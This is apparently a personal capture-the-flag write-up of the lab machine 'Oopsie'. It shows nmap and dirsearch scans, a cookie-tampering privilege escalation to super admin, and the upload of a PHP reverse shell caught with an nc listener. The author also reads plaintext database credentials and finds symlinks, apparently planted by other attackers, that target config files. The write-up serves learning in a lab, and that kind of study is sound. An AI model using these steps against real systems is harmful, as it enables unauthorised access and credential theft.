# Writeup

## Versions

- Apache httpd 2.4.29 ((Ubuntu))
- Linux OS

## Vuln research

- <https://httpd.apache.org/security/vulnerabilities_24.html>

## Web browsing

### Google Chrome

- Says "Please login to get access to the service" on <http://10.10.10.28/#>.

What does network panel say?

This link <http://10.10.10.28/cdn-cgi/login/script.js> looks suspicious but is empty in Chrome.

Let's try going to <http://10.10.10.28/cdn-cgi/login>.

I used the uname+pw `admin:MEGACORP_4dm1n!!` to get in. I got the password from the previous box, 'archetype' (as this is the starting point lab.)

#### <http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=1>
34322	admin	admin@megacorp.com

### Cookies

    user=34322
    role=admin

I realize that the HTTP requests look like this:

```
GET /cdn-cgi/login/admin.php?content=accounts&id=1 HTTP/1.1
Host: 10.10.10.28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.10.28/cdn-cgi/login/admin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: user=34322; role=admin
Connection: close
```

Holy crap. There's no session token! The Cookie contains all of the User ID information!

If I try to go to <http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads>, I get the message,

> This action require super admin rights.

If I change my cookie with Burp Suite, I might be able to get different responses.

I noticed that if I change the `user` cookie to something other than `34322`, I get logged out, but if I change the `role`, nothing happens.

I was also going to use a 'intruder' attack from Burp Suite to see what 'id' values I could get from the site.

```
GET /cdn-cgi/login/admin.php?content=accounts&id=§foo§ HTTP/1.1
Host: 10.10.10.28
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.10.28/cdn-cgi/login/admin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: user=34322; role=admin
Connection: close
```

From 1-100, these IDs existed, and gave these results from the `/cdn-cgi/login/admin.php?content=accounts&id=§foo§` page.

-   n (format)
    -   access id:name:email
-   1
    -   34322:admin:admin@megacorp.com
-   4
    -   8832:john:john@tafcz.co.uk
-   13
    -   57633:Peter:peter@qpic.co.uk
-   23
    -   28832:Rafol:tom@rafol.co.uk
-   30
    -   86575:super admin:superadmin@megacorp.com

Also, this page (from repeating requests with OWASP ZAP):

<http://10.10.10.28/cdn-cgi/login/admin.php?content=branding&brandId=1>

Has the brandIds:

-   n
    -   brand id:model:price
-   1
    -   1:MC-1023:$100,240
-   10
    -   10:MC-1123:$110,240
-   20
    -   20:MC-2123:$110,340

I decided to use this cookie value:

    Cookie: role=super admin; user=86575

And now I can use this page.

    http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads

When I upload an image of a smiley, `smiley.jpg`, this is what the HTTP POST looks like.

```
POST http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads&action=upload HTTP/1.1
Connection: keep-alive
Content-Length: 1720
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://10.10.10.28
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTDYfcyk941FC7nbK
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://10.10.10.28/cdn-cgi/login/admin.php?content=uploads
Accept-Language: en-US,en;q=0.9
Cookie: role=super admin; user=86575
dnt: 1
sec-gpc: 1
Host: 10.10.10.28
```

...And the body of the POST.

```
------WebKitFormBoundaryTDYfcyk941FC7nbK
Content-Disposition: form-data; name="name"

smiley
------WebKitFormBoundaryTDYfcyk941FC7nbK
Content-Disposition: form-data; name="fileToUpload"; filename="smiley.jpg"
Content-Type: image/jpeg

ÿØÿà JFIF ,,  ÿþ Created with GIMPÿâ°ICC_PROFILE    lcms0  mntrRGB XYZ å    7 +acspAPPL                          öÖ     Ó-lcms                                               
desc      @cprt  `   6wtpt     chad  ¬   ,rXYZ  Ø   bXYZ  ì   gXYZ      rTRC      gTRC      bTRC      chrm  4   $dmnd  X   $dmdd  |   $mluc          enUS   $    G I M P   b u i l t - i n   s R G Bmluc          enUS       P u b l i c   D o m a i n  XYZ       öÖ     Ó-sf32     B  Þÿÿó%    ýÿÿû¡ÿÿý¢  Ü  ÀnXYZ       o   8õ  XYZ       $    ¶ÄXYZ       b  ·  Ùpara        ff  ò§  
Y  Ð  
[chrm         £×  T|  LÍ    &g  \mluc          enUS       G I M Pmluc          enUS       s R G BÿÛ C ÿÛ CÿÂ  
 
 ÿÄ                	ÿÄ                 ÿÚ    ×¢Ò~ÿÄ                ÿÚ  6ß.8»Áevªªß4ÿÄ                 ÿÚ ?ÿÄ                 ÿÚ ?ÿÄ #           !"#1ÿÚ  ?êDêÓÄ}cn
!ÏÏÓÈ®¥AQg
7ó§Ý# µ¹·æ\½_O½2 Å5^j×`¡1`M\Äò%ÌO{5/VyVö]á>h²ÚÌéúÀÿ 9°	F<¿ÿÄ               !AÿÚ  ?!u|TQHôY#%õº*Fâ<$?\×j£ÿÚ      ÿÄ                 ÿÚ ?ÿÄ                 ÿÚ ?ÿÄ              ÿÚ  ?bwlzSÿ $Cx¼ÓÜÎ.z&ù÷ÿÙ
------WebKitFormBoundaryTDYfcyk941FC7nbK--
```

I want to use the 'Model' name as the "name" value in the Content-Disposition header. I'll try `MC-1023` as a value and see if the image shows up.

I tried 'Tafcz' and also 'MC-1023' but I am stuck.

I'm going to read the write-up for oopsie box.

<img src="https://merriam-webster.com/assets/mw/images/article/art-wap-article-main/headdesk-2560-44956df35ded58048d9aa3923774657c@1x.jpg"></img>

### dirb http://10.10.10.28/

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Mar  9 22:27:04 2021
URL_BASE: http://10.10.10.28/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.28/ ----
==> DIRECTORY: http://10.10.10.28/css/                                         
==> DIRECTORY: http://10.10.10.28/fonts/                                       
==> DIRECTORY: http://10.10.10.28/images/                                      
+ http://10.10.10.28/index.php (CODE:200|SIZE:10932)                           
==> DIRECTORY: http://10.10.10.28/js/                                          
+ http://10.10.10.28/server-status (CODE:403|SIZE:276)                         
==> DIRECTORY: http://10.10.10.28/themes/                                      
==> DIRECTORY: http://10.10.10.28/uploads/                                     
                                                                               
---- Entering directory: http://10.10.10.28/css/ ----
                                                                               
---- Entering directory: http://10.10.10.28/fonts/ ----
                                                                               
---- Entering directory: http://10.10.10.28/images/ ----
                                                                               
---- Entering directory: http://10.10.10.28/js/ ----
                                                                               
---- Entering directory: http://10.10.10.28/themes/ ----
                                                                               
---- Entering directory: http://10.10.10.28/uploads/ ----
                                                                               
-----------------
END_TIME: Tue Mar  9 22:42:51 2021

```

## nmap

### sudo nmap 10.10.10.28 -sV -sC

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 22:24 CST
Nmap scan report for 10.10.10.28
Host is up (0.030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
```

### nmap -sS -A 10.10.10.28

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-06 20:40 CST
Nmap scan report for 10.10.10.28
Host is up (0.034s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/6%OT=22%CT=1%CU=41013%PV=Y%DS=2%DC=T%G=Y%TM=60443D1F
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   28.60 ms 10.10.14.1
2   28.70 ms 10.10.10.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds
```

## post-file upload page

(after getting stuck)

Turns out I'm supposed to just upload a PHP reverse shell, i.e. at `/usr/share/webshells/php/php-reverse-shell.php`, and use `dirsearch` to search for it, then connect using `nc` and "upgrade the shell", whatever that means.

Then will try on my own from there.

The shell is in `payload/`. Important options:

```php
$ip = '10.10.14.245';
$port = 1234;
```

Download dirsearch and run it:

    cd ~/Github; git clone https://github.com/maurosoria/dirsearch
    python3 dirsearch.py -e php,html,js -u http://10.10.10.28

Output:

```
┌─[vagrant@vagrant-virtualbox]─[~/Github/dirsearch]
└──╼ $python3 dirsearch.py -e php,html,js -u http://10.10.10.28
/home/vagrant/Github/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (4.0.0) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 9852

Error Log: /home/vagrant/Github/dirsearch/logs/errors-21-03-12_18-46-35.log

Target: http://10.10.10.28/

Output File: /home/vagrant/Github/dirsearch/reports/10.10.10.28/_21-03-12_18-46-35.txt

[18:46:35] Starting: 
[18:46:35] 301 -  307B  - /js  ->  http://10.10.10.28/js/
[18:46:37] 403 -  276B  - /.ht_wsr.txt
[18:46:37] 403 -  276B  - /.htaccess.bak1
[18:46:37] 403 -  276B  - /.htaccess.save
[18:46:37] 403 -  276B  - /.htaccess.sample
[18:46:37] 403 -  276B  - /.htaccess.orig
[18:46:37] 403 -  276B  - /.htaccessBAK
[18:46:37] 403 -  276B  - /.htaccessOLD
[18:46:37] 403 -  276B  - /.htaccessOLD2
[18:46:37] 403 -  276B  - /.htaccess_sc
[18:46:37] 403 -  276B  - /.htaccess_extra
[18:46:37] 403 -  276B  - /.htm
[18:46:37] 403 -  276B  - /.htaccess_orig
[18:46:37] 403 -  276B  - /.html
[18:46:37] 403 -  276B  - /.httr-oauth
[18:46:37] 403 -  276B  - /.htpasswds
[18:46:37] 403 -  276B  - /.htpasswd_test
[18:46:37] 403 -  276B  - /.php
[18:46:43] 301 -  308B  - /css  ->  http://10.10.10.28/css/
[18:46:44] 301 -  310B  - /fonts  ->  http://10.10.10.28/fonts/
[18:46:44] 301 -  311B  - /images  ->  http://10.10.10.28/images/
[18:46:44] 403 -  276B  - /images/
[18:46:44] 200 -   11KB - /index.php
[18:46:44] 200 -   11KB - /index.php/login/
[18:46:44] 403 -  276B  - /js/
[18:46:47] 403 -  276B  - /server-status
[18:46:47] 403 -  276B  - /server-status/
[18:46:47] 301 -  311B  - /themes  ->  http://10.10.10.28/themes/
[18:46:47] 403 -  276B  - /themes/
[18:46:48] 301 -  312B  - /uploads  ->  http://10.10.10.28/uploads/
[18:46:48] 403 -  276B  - /uploads/

Task Completed
```

This line:

    [18:46:48] 301 -  312B  - /uploads  ->  http://10.10.10.28/uploads/

Has what we want.

Start nc listener:

    nc -nvlp 1234

Time to upload a php file.

Upload `payload/test.php` on page <http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads&action=upload> and go to `http://10.10.10.28/uploads/test.php`. Should see a marquee!

Then do the same with `shell.php`!

<http://10.10.10.28/uploads/shell1.php>

Post-upload success, we have shell!

```
┌─[vagrant@vagrant-virtualbox]─[~]
└──╼ $nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.245] from (UNKNOWN) [10.10.10.28] 33894
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:05:18 up  2:58,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ip a | grep inet
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
    inet 10.10.10.28/24 brd 10.10.10.255 scope global ens160
    inet6 dead:beef::250:56ff:feb9:1fb5/64 scope global dynamic mngtmpaddr 
    inet6 fe80::250:56ff:feb9:1fb5/64 scope link 
```

## Upgrade shell

Run 

    python3 -c 'import pty; pty.spawn("/bin/bash")'
    
to upgrade shell. This is not the best option but whatever.

And I can run `cat /home/robert/user.txt` for 1 flag.

I then ran `id` and got

    uid=33(www-data) gid=33(www-data) groups=33(www-data)

So, off to `/var/www` to poke around.

    ls /var/www/html
    cdn-cgi  css  fonts  images  index.php	js  themes  uploads

Off to `cdn-cgi/`, as I think it may have code. Then, I download those files.

Looks like `db.php` has some creds.

<https://www.php.net/manual/en/function.mysqli-connect.php>

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

User `robert` password `M3g4C0rpUs3r!` on database `garage` at `localhost`...

I run this in the reverse shell:

    mysql -u robert -h localhost -p "M3g4C0rpUs3r!"

But it doesn't work.

I'm stuck again, and going to try to get a better reverse shell. The one from 'pentestmonkey@pentestmonkey.net' is annoying.

Once I get a better reverse shell, if I'm still stuck, I may give up and try to read the hints.

I can't get a better reverse shell, `shell3.php` and `socat ...` don't work. Oh well.

I'm going to try to do a scan or something to detect vulnerabilities or credentials.

I just found something in `uploads/`!!


```
www-data@oopsie:/var/www/html$ ls **/
ls **/
cdn-cgi/:
login

css/:
1.css		   font-awesome.min.css  new.css	    reset.min.css
bootstrap.min.css  ionicons.min.css	 normalize.min.css

fonts/:
fontawesome-webfont.ttf

images/:
1.jpg  2.jpg  3.jpg

js/:
bootstrap.min.js  index.js  jquery.min.js  min.js  prefixfree.min.js

themes/:
theme.css

uploads/:
AKP  INDRAJITH	Indrajith
```

A bunch of folders under `uploads/`!

Under `uploads/Indrajith` there's a .htaccess file...

```
www-data@oopsie:/var/www/html/uploads/Indrajith$ cat .htaccess
cat .htaccess
Options all
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
```

And a massive amount of symlinks under the `INDRAJITH`, a differently-named folder.

I think these might be coming from other attackers.

```
www-data@oopsie:/var/www/html/uploads/INDRAJITH$ ls -lash
ls -lash
total 24K
   0 lrwxrwxrwx 1 www-data www-data   34 Mar 27 17:09 ' =>conf_global.php' -> /home//public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   29 Mar 27 17:09 ' =>config.php' -> /home//public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   36 Mar 27 17:09 ' =>configuration.php' -> /home//public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   32 Mar 27 17:09 ' =>wp-config.php' -> /home//public_html/wp-config.php
 12K drwxr-xr-x 2 www-data www-data  12K Mar 27 17:09  .
4.0K drwxrwxrwx 5 root     root     4.0K Mar 27 18:35  ..
4.0K -rw-r--r-- 1 www-data www-data  160 Mar 27 17:09  .htaccess
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 '_apt =>conf_global.php' -> /home/_apt/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   33 Mar 27 17:09 '_apt =>config.php' -> /home/_apt/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 '_apt =>configuration.php' -> /home/_apt/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   36 Mar 27 17:09 '_apt =>wp-config.php' -> /home/_apt/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'backup =>conf_global.php' -> /home/backup/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   35 Mar 27 17:09 'backup =>config.php' -> /home/backup/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   42 Mar 27 17:09 'backup =>configuration.php' -> /home/backup/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'backup =>wp-config.php' -> /home/backup/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   37 Mar 27 17:09 'bin =>conf_global.php' -> /home/bin/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   32 Mar 27 17:09 'bin =>config.php' -> /home/bin/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   39 Mar 27 17:09 'bin =>configuration.php' -> /home/bin/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   35 Mar 27 17:09 'bin =>wp-config.php' -> /home/bin/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'daemon =>conf_global.php' -> /home/daemon/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   35 Mar 27 17:09 'daemon =>config.php' -> /home/daemon/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   42 Mar 27 17:09 'daemon =>configuration.php' -> /home/daemon/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'daemon =>wp-config.php' -> /home/daemon/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   41 Mar 27 17:09 'dnsmasq =>conf_global.php' -> /home/dnsmasq/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   36 Mar 27 17:09 'dnsmasq =>config.php' -> /home/dnsmasq/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   43 Mar 27 17:09 'dnsmasq =>configuration.php' -> /home/dnsmasq/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   39 Mar 27 17:09 'dnsmasq =>wp-config.php' -> /home/dnsmasq/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   39 Mar 27 17:09 'games =>conf_global.php' -> /home/games/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   34 Mar 27 17:09 'games =>config.php' -> /home/games/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   41 Mar 27 17:09 'games =>configuration.php' -> /home/games/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   37 Mar 27 17:09 'games =>wp-config.php' -> /home/games/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   39 Mar 27 17:09 'gnats =>conf_global.php' -> /home/gnats/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   34 Mar 27 17:09 'gnats =>config.php' -> /home/gnats/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   41 Mar 27 17:09 'gnats =>configuration.php' -> /home/gnats/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   37 Mar 27 17:09 'gnats =>wp-config.php' -> /home/gnats/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   37 Mar 27 17:09 'irc =>conf_global.php' -> /home/irc/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   32 Mar 27 17:09 'irc =>config.php' -> /home/irc/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   39 Mar 27 17:09 'irc =>configuration.php' -> /home/irc/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   35 Mar 27 17:09 'irc =>wp-config.php' -> /home/irc/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   43 Mar 27 17:09 'landscape =>conf_global.php' -> /home/landscape/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'landscape =>config.php' -> /home/landscape/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   45 Mar 27 17:09 'landscape =>configuration.php' -> /home/landscape/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   41 Mar 27 17:09 'landscape =>wp-config.php' -> /home/landscape/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'list =>conf_global.php' -> /home/list/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   33 Mar 27 17:09 'list =>config.php' -> /home/list/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'list =>configuration.php' -> /home/list/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   36 Mar 27 17:09 'list =>wp-config.php' -> /home/list/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   36 Mar 27 17:09 'lp =>conf_global.php' -> /home/lp/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   31 Mar 27 17:09 'lp =>config.php' -> /home/lp/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'lp =>configuration.php' -> /home/lp/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   34 Mar 27 17:09 'lp =>wp-config.php' -> /home/lp/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   37 Mar 27 17:09 'lxd =>conf_global.php' -> /home/lxd/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   32 Mar 27 17:09 'lxd =>config.php' -> /home/lxd/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   39 Mar 27 17:09 'lxd =>configuration.php' -> /home/lxd/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   35 Mar 27 17:09 'lxd =>wp-config.php' -> /home/lxd/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'mail =>conf_global.php' -> /home/mail/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   33 Mar 27 17:09 'mail =>config.php' -> /home/mail/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'mail =>configuration.php' -> /home/mail/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   36 Mar 27 17:09 'mail =>wp-config.php' -> /home/mail/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   37 Mar 27 17:09 'man =>conf_global.php' -> /home/man/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   32 Mar 27 17:09 'man =>config.php' -> /home/man/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   39 Mar 27 17:09 'man =>configuration.php' -> /home/man/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   35 Mar 27 17:09 'man =>wp-config.php' -> /home/man/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   44 Mar 27 17:09 'messagebus =>conf_global.php' -> /home/messagebus/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   39 Mar 27 17:09 'messagebus =>config.php' -> /home/messagebus/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   46 Mar 27 17:09 'messagebus =>configuration.php' -> /home/messagebus/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   42 Mar 27 17:09 'messagebus =>wp-config.php' -> /home/messagebus/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   39 Mar 27 17:09 'mysql =>conf_global.php' -> /home/mysql/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   34 Mar 27 17:09 'mysql =>config.php' -> /home/mysql/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   41 Mar 27 17:09 'mysql =>configuration.php' -> /home/mysql/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   37 Mar 27 17:09 'mysql =>wp-config.php' -> /home/mysql/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'news =>conf_global.php' -> /home/news/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   33 Mar 27 17:09 'news =>config.php' -> /home/news/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'news =>configuration.php' -> /home/news/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   36 Mar 27 17:09 'news =>wp-config.php' -> /home/news/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'nobody =>conf_global.php' -> /home/nobody/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   35 Mar 27 17:09 'nobody =>config.php' -> /home/nobody/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   42 Mar 27 17:09 'nobody =>configuration.php' -> /home/nobody/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'nobody =>wp-config.php' -> /home/nobody/public_html/wp-config.php
4.0K -rw-r--r-- 1 www-data www-data   36 Mar 27 17:09  php.ini
   0 lrwxrwxrwx 1 www-data www-data   43 Mar 27 17:09 'pollinate =>conf_global.php' -> /home/pollinate/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'pollinate =>config.php' -> /home/pollinate/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   45 Mar 27 17:09 'pollinate =>configuration.php' -> /home/pollinate/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   41 Mar 27 17:09 'pollinate =>wp-config.php' -> /home/pollinate/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   39 Mar 27 17:09 'proxy =>conf_global.php' -> /home/proxy/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   34 Mar 27 17:09 'proxy =>config.php' -> /home/proxy/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   41 Mar 27 17:09 'proxy =>configuration.php' -> /home/proxy/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   37 Mar 27 17:09 'proxy =>wp-config.php' -> /home/proxy/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'robert =>conf_global.php' -> /home/robert/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   35 Mar 27 17:09 'robert =>config.php' -> /home/robert/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   42 Mar 27 17:09 'robert =>configuration.php' -> /home/robert/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'robert =>wp-config.php' -> /home/robert/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data    1 Mar 27 17:09  root -> /
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'root =>conf_global.php' -> /home/root/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   33 Mar 27 17:09 'root =>config.php' -> /home/root/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'root =>configuration.php' -> /home/root/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   36 Mar 27 17:09 'root =>wp-config.php' -> /home/root/public_html/wp-config.php
